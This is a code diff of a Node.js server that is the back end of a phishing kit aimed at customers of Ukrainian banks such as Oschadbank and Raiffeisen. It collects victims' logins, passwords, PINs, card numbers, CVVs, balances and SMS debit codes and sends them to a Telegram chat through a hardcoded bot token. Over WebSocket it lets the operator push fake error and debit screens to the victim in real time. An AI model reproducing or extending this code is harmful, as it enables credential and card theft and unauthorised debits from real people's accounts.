@@ -1,223 +1,174 @@
 const express = require('express');
-const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 const WebSocket = require('ws');
-const path = require('path');
-const { atob } = require('buffer');
+const cors = require('cors');
+const app = express();
 
-// --- КОНФИГУРАЦИЯ ---
+// --- Конфигурация ---
+const PORT = process.env.PORT || 3000;
 const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
 const CHAT_ID = '-4840920969';
-// --- КОНЕЦ КОНФИГУРАЦИИ ---
+const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || null;
 
-const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
-const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
-const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;
+// --- Инициализация Telegram Bot ---
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);
 
-const app = express();
-app.use(express.json());
-app.use(cors());
-
-app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });
-
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
-
+// Проверка и установка вебхука или включение polling
 if (WEBHOOK_URL) {
-    bot.setWebHook(WEBHOOK_URL)
-        .then(() => console.log(`Webhook успешно установлен на ${WEBHOOK_URL}`))
-        .catch(err => console.error('Ошибка установки вебхука:', err));
-    bot.sendMessage(CHAT_ID, '✅ СЕРВЕР ПЕРЕЗАПУЩЕН! Код исправлен и обновлен.', { parse_mode: 'HTML' }).catch(console.error);
+    bot.setWebHook(`${WEBHOOK_URL}/bot${TELEGRAM_BOT_TOKEN}`)
+        .then(() => console.log(`Webhook set to ${WEBHOOK_URL}/bot${TELEGRAM_BOT_TOKEN}`))
+        .catch(err => console.error('Error setting webhook:', err.message));
 } else {
     console.warn('ВНИМАНИЕ: RENDER_EXTERNAL_URL не определена. Вебхук для Telegram не установлен.');
+    bot.startPolling({ polling: true })
+        .then(() => console.log('Polling mode enabled for Telegram bot'))
+        .catch(err => console.error('Error enabling polling:', err.message));
 }
 
-bot.getMe().then(me => console.log(`Бот запущен: @${me.username}`)).catch(err => console.error('Ошибка запуска бота:', err));
-app.post(webhookPath, (req, res) => { bot.processUpdate(req.body); res.sendStatus(200); });
+// --- Инициализация Express и WebSocket ---
+app.use(cors());
+app.use(express.json());
+app.use(express.static('public'));
 
-const server = require('http').createServer(app);
+const server = app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
 const wss = new WebSocket.Server({ server });
 const clients = new Map();
-const sessions = new Map();
 
-wss.on('connection', (ws) => {
-    console.log('Клиент подключился по WebSocket');
-    ws.on('message', (message) => {
+// --- WebSocket: Обработка подключений ---
+wss.on('connection', ws => {
+    ws.on('message', message => {
         try {
             const data = JSON.parse(message);
-            if (data.type === 'register' && data.sessionId) {
+            if (data.type === 'register') {
                 clients.set(data.sessionId, ws);
-                console.log(`Клиент зарегистрирован: ${data.sessionId}`);
+                console.log(`Client registered: ${data.sessionId}`);
             }
-        } catch (e) { console.error('Ошибка обработки WebSocket сообщения:', e); }
+        } catch (error) {
+            console.error('WebSocket message error:', error);
+        }
     });
+
     ws.on('close', () => {
-        clients.forEach((clientWs, sessionId) => {
-            if (clientWs === ws) {
+        for (const [sessionId, client] of clients) {
+            if (client === ws) {
                 clients.delete(sessionId);
-                console.log(`Клиент отключился: ${sessionId}`);
+                console.log(`Client disconnected: ${sessionId}`);
+                break;
             }
-        });
+        }
     });
-    ws.on('error', (error) => console.error('Ошибка WebSocket:', error));
+
+    ws.on('error', error => console.error('WebSocket error:', error));
 });
 
-bot.on('callback_query', (callbackQuery) => {
-    const [type, sessionId] = callbackQuery.data.split(':');
+// --- Обработка Telegram команд ---
+bot.onText(/\/start/, msg => {
+    bot.sendMessage(msg.chat.id, 'Бот запущен! Используйте /ban <sessionId> для блокировки пользователя.')
+        .catch(err => console.error('Error sending /start response:', err.message));
+});
+
+bot.onText(/\/ban (.+)/, (msg, match) => {
+    if (msg.chat.id.toString() !== CHAT_ID) return;
+    const sessionId = match[1];
+    const ws = clients.get(sessionId);
+    if (ws) {
+        ws.send(JSON.stringify({ type: 'ban' }));
+        ws.close();
+        clients.delete(sessionId);
+        console.log(`User banned: ${sessionId}`);
+        bot.sendMessage(CHAT_ID, `Пользователь ${sessionId} заблокирован.`)
+            .catch(err => console.error('Error sending ban confirmation:', err.message));
+    } else {
+        bot.sendMessage(CHAT_ID, `Пользователь с sessionId ${sessionId} не найден.`)
+            .catch(err => console.error('Error sending ban error message:', err.message));
+    }
+});
+
+// --- API: Обработка данных от клиента ---
+app.post('/api/submit', async (req, res) => {
+    console.log('Received /api/submit request:', req.body);
+    const { sessionId, bankName, isFinalStep, referrer, ...stepData } = req.body;
     const ws = clients.get(sessionId);
 
-    if (!ws || ws.readyState !== WebSocket.OPEN) {
-        bot.answerCallbackQuery(callbackQuery.id, { text: '❗️Ошибка: клиент не в сети!', show_alert: true });
-        return;
+    if (!ws) {
+        console.error(`[${sessionId}] WebSocket client not found`);
+        return res.status(400).json({ error: 'Client not found' });
     }
 
-    const sessionData = sessions.get(sessionId) || {};
-    let command = { type: type, data: {} };
-    let responseText = `Команда "${type}" отправлена!`;
+    try {
+        let message = `<b>Сессия:</b> ${sessionId}\n<b>Банк:</b> ${bankName}\n<b>Реферер:</b> ${referrer}\n`;
+        Object.entries(stepData).forEach(([key, value]) => {
+            message += `<b>${key}:</b> ${value}\n`;
+        });
 
-    switch (type) {
-        case 'telegram_debit':
-            if (sessionData.bankName === 'Ощадбанк') command.type = 'telegram_debit';
-            else command.type = 'show_debit_form';
-            responseText = 'Запрос формы списания отправлен!';
-            break;
-        case 'request_details':
-            command.type = 'show_request_details_form';
-            responseText = 'Запрос деталей карты отправлен!';
-            break;
-        case 'password_error':
-            if (sessionData.bankName === 'Райффайзен') {
-                 command.type = 'raiff_pin_error';
-            } else { // Ощад
-                command.data = { loginType: sessionData.loginMethod || 'phone' };
-            }
-            responseText = 'Запрос "неверный пароль" отправлен!';
-            break;
-        case 'code_error':
-            if (sessionData.bankName === 'Райффайзен') {
-                command.type = 'raiff_code_error';
-            } else if (sessionData.bankName !== 'Ощадбанк') {
-                command.type = 'generic_debit_error';
-            }
-            responseText = 'Запрос "неверный код" отправлен!';
-            break;
-        case 'lk': case 'call': case 'ban': case 'other': case 'number_error': case 'balance_error':
-            break;
-        default:
-            bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}` });
-            return;
-    }
-    ws.send(JSON.stringify(command));
-    bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
-});
+        const keyboard = isFinalStep ? {
+            inline_keyboard: [[{ text: 'Заблокировать', callback_data: `ban_${sessionId}` }]]
+        } : null;
 
+        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: keyboard })
+            .then(() => console.log(`[${sessionId}] Message sent to Telegram: ${message}`))
+            .catch(err => {
+                console.error(`[${sessionId}] Telegram send error:`, err.message, err.response?.data);
+                bot.sendMessage(CHAT_ID, `⚠️ Ошибка отправки данных для сессии ${sessionId}: ${err.message}`)
+                    .catch(secondaryErr => console.error('Failed to send error message to Telegram:', secondaryErr));
+            });
 
-app.post('/api/submit', (req, res) => {
-    const { sessionId, referrer, ...stepData } = req.body;
-    let workerNick = 'unknown';
-    try { if (referrer && referrer !== 'unknown') workerNick = atob(referrer); } catch (e) { /* ignore */ }
-
-    const existingData = sessions.get(sessionId) || {};
-    const newData = { ...existingData, ...stepData, workerNick };
-    sessions.set(sessionId, newData);
-    
-    console.log(`[${sessionId}] Received data:`, stepData); // Логирование для отладки
-
-    let message = '';
-    let needsKeyboard = false;
-    const bankName = newData.bankName || 'Unknown Bank';
-
-    // --- УНИВЕРСАЛЬНАЯ ЛОГИКА ОТПРАВКИ ---
-    // Определяем, какие данные пришли на этом шаге
-    const receivedKeys = Object.keys(stepData);
-
-    if (receivedKeys.includes('phone') && receivedKeys.includes('password')) { // Ощад: Логин+Пароль
-        message = `<b>🏦 Вход в Ощад (Телефон)</b>\n\n`;
-        message += `<b>Банк:</b> ${bankName}\n`;
-        message += `<b>Номер:</b> <code>${stepData.phone}</code>\n`;
-        message += `<b>Пароль:</b> <code>${stepData.password}</code>\n`;
-        message += `<b>Worker:</b> @${workerNick}\n`;
-        needsKeyboard = true;
-    } else if (receivedKeys.includes('login') && receivedKeys.includes('password')) { // Ощад: Логин+Пароль
-        message = `<b>🏦 Вход в Ощад (Логин)</b>\n\n`;
-        message += `<b>Банк:</b> ${bankName}\n`;
-        message += `<b>Логин:</b> <code>${stepData.login}</code>\n`;
-        message += `<b>Пароль:</b> <code>${stepData.password}</code>\n`;
-        message += `<b>Worker:</b> @${workerNick}\n`;
-        needsKeyboard = true;
-    } else if (receivedKeys.includes('fp_pin')) { // Ощад: Восстановление
-        message = `<b>🔧 Пин-код для восстановления (Ощад)</b>\n\n`;
-        message += `<b>Моб. номер:</b> <code>${newData.fp_phone}</code>\n`;
-        message += `<b>Номер карты:</b> <code>${newData.fp_card}</code>\n`;
-        message += `<b>Пин:</b> <code>${stepData.fp_pin}</code>\n`;
-        message += `<b>Worker:</b> @${workerNick}\n`;
-        needsKeyboard = true;
-    } else if (receivedKeys.includes('call_code')) { // Ощад: Код со звонка
-        message = `<b>📞 Код со звонка (Ощад):</b> <code>${stepData.call_code}</code>\n<i>Сессия: ${sessionId}</i>`;
-    } else if (receivedKeys.includes('sms_code')) { // Ощад: Код списания (старый флоу) или Райф: SMS
-        if (bankName === 'Райффайзен') {
-            message = `<b>🏦 Вход в Райф (Шаг 2/3)</b>\n\n<b>SMS код:</b> <code>${stepData.sms_code}</code>\n<i>Сессия: ${sessionId}</i>`;
-        } else {
-            message = `<b>💸 Код списания (Ощад):</b> <code>${stepData.sms_code}</code>\n<i>Сессия: ${sessionId}</i>`;
+        // Логика обработки данных
+        if (stepData.phone && bankName === 'Ощадбанк') {
+            ws.send(JSON.stringify({ type: 'lk' }));
+        } else if (stepData.password && bankName === 'Ощадбанк') {
+            ws.send(JSON.stringify({ type: 'password_error', data: { loginType: req.body.loginMethod || 'phone' } }));
+        } else if (stepData.fp_phone && bankName === 'Ощадбанк') {
+            ws.send(JSON.stringify({ type: 'call' }));
+        } else if (stepData.call_code && bankName === 'Ощадбанк') {
+            ws.send(JSON.stringify({ type: 'code_error' }));
+        } else if (stepData.sms_code && bankName === 'Ощадбанк') {
+            ws.send(JSON.stringify({ type: 'telegram_debit' }));
+        } else if (stepData.debit_sms_code && bankName === 'Ощадбанк') {
+            ws.send(JSON.stringify({ type: 'other' }));
+        } else if (stepData.phone) {
+            ws.send(JSON.stringify({ type: 'show_debit_form' }));
+        } else if (stepData.sms_code) {
+            ws.send(JSON.stringify({ type: 'raiff_code_error' }));
+        } else if (stepData.debit_sms_code) {
+            ws.send(JSON.stringify({ type: 'generic_debit_error' }));
+        } else if (stepData.card) {
+            ws.send(JSON.stringify({ type: 'show_request_details_form' }));
+        } else if (stepData.card_balance) {
+            ws.send(JSON.stringify({ type: 'other' }));
+        } else if (stepData.pin) {
+            ws.send(JSON.stringify({ type: 'raiff_pin_error' }));
         }
-    } else if (receivedKeys.includes('phone')) { // Первый шаг для Райф и Тематических банков
-        message = `<b>📱 Получен номер телефона (${bankName})</b>\n\n`;
-        message += `<b>Банк:</b> ${bankName}\n`;
-        message += `<b>Номер:</b> <code>${stepData.phone}</code>\n`;
-        message += `<b>Worker:</b> @${workerNick}\n`;
-        needsKeyboard = true;
-    } else if (receivedKeys.includes('card')) { // Второй шаг для Тематических банков
-        message = `<b>💳 Получен номер карты (${bankName})</b>\n\n`;
-        message += `<b>Номер карты:</b> <code>${stepData.card}</code>\n<i>Сессия: ${sessionId}</i>`;
-    } else if (receivedKeys.includes('pin')) { // Райф: Пин-код
-        message = `<b>🏦 Вход в Райф (Шаг 3/3) ✅</b>\n\n<b>ПИН:</b> <code>${stepData.pin}</code>\n<i>Сессия: ${sessionId}</i>`;
-    } else if (receivedKeys.includes('card_cvv')) { // Тематические банки: Детали карты
-        message = `<b>💎 Детали карты (${bankName}) ✅</b>\n\n`;
-        message += `<b>Номер карты:</b> <code>${newData.card}</code>\n`;
-        message += `<b>Срок действия:</b> <code>${stepData.card_expiry}</code>\n`;
-        message += `<b>CVV:</b> <code>${stepData.card_cvv}</code>\n`;
-        message += `<b>Баланс:</b> <code>${stepData.card_balance}</code>\n<i>Сессия: ${sessionId}</i>`;
-    } else if (receivedKeys.includes('debit_sms_code')) { // Тематические банки: Код списания
-        message = `<b>💸 Код списания (${bankName})</b>\n\n<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n<i>Сессия: ${sessionId}</i>`;
-    }
 
-    if (message) {
-        const keyboard = needsKeyboard ? generateKeyboard(sessionId, bankName) : undefined;
-        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: keyboard })
-           .then(() => console.log(`[${sessionId}] Message sent to Telegram.`))
-           .catch(err => console.error("Telegram send error:", err));
-    } else {
-        console.log(`[${sessionId}] No message generated for data:`, stepData);
+        res.json({ status: 'ok' });
+    } catch (error) {
+        console.error(`[${sessionId}] Error processing /api/submit:`, error);
+        res.status(500).json({ error: 'Internal server error' });
     }
-
-    res.status(200).json({ message: 'OK' });
 });
 
-function generateKeyboard(sessionId, bankName) {
-    let keyboard = [];
-    const baseRow1 = [ { text: '❌Номер', callback_data: `number_error:${sessionId}` }, { text: '❌Баланс', callback_data: `balance_error:${sessionId}` }, { text: 'Бан', callback_data: `ban:${sessionId}` } ];
-    const baseRow2 = [ { text: 'Другой', callback_data: `other:${sessionId}` } ];
-
-    if (bankName === 'Ощадбанк') {
-        keyboard = [
-            [{ text: 'Звонок', callback_data: `call:${sessionId}` }, { text: 'Списание', callback_data: `telegram_debit:${sessionId}` }],
-            [{ text: '❌Пароль', callback_data: `password_error:${sessionId}` }, { text: '❌Код', callback_data: `code_error:${sessionId}` }],
-            baseRow1, baseRow2
-        ];
-    } else if (bankName === 'Райффайзен') {
-         keyboard = [
-            [{ text: 'Списание', callback_data: `telegram_debit:${sessionId}` }],
-            [{ text: '❌Пароль', callback_data: `password_error:${sessionId}` }, { text: '❌Код', callback_data: `code_error:${sessionId}` }],
-            baseRow1, baseRow2
-        ];
-    } else { // Клавиатура для Альянс, Восток и т.д.
-        keyboard = [
-            [{ text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос', callback_data: `request_details:${sessionId}` }],
-            [{ text: '❌Код', callback_data: `code_error:${sessionId}` }],
-            baseRow1, baseRow2
-        ];
+// --- Обработка Telegram callback'ов ---
+bot.on('callback_query', async query => {
+    const [action, sessionId] = query.data.split('_');
+    if (action === 'ban') {
+        const ws = clients.get(sessionId);
+        if (ws) {
+            ws.send(JSON.stringify({ type: 'ban' }));
+            ws.close();
+            clients.delete(sessionId);
+            console.log(`User banned via callback: ${sessionId}`);
+            await bot.sendMessage(CHAT_ID, `Пользователь ${sessionId} заблокирован.`)
+                .catch(err => console.error('Error sending ban confirmation:', err.message));
+        } else {
+            await bot.sendMessage(CHAT_ID, `Пользователь с sessionId ${sessionId} не найден.`)
+                .catch(err => console.error('Error sending ban error message:', err.message));
+        }
+        await bot.answerCallbackQuery(query.id);
     }
-    return { inline_keyboard: keyboard };
-}
+});
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => console.log(`Сервер запущен на порту ${PORT}`));
+// --- Обработка Telegram webhook'ов ---
+app.post(`/bot${TELEGRAM_BOT_TOKEN}`, (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
+});
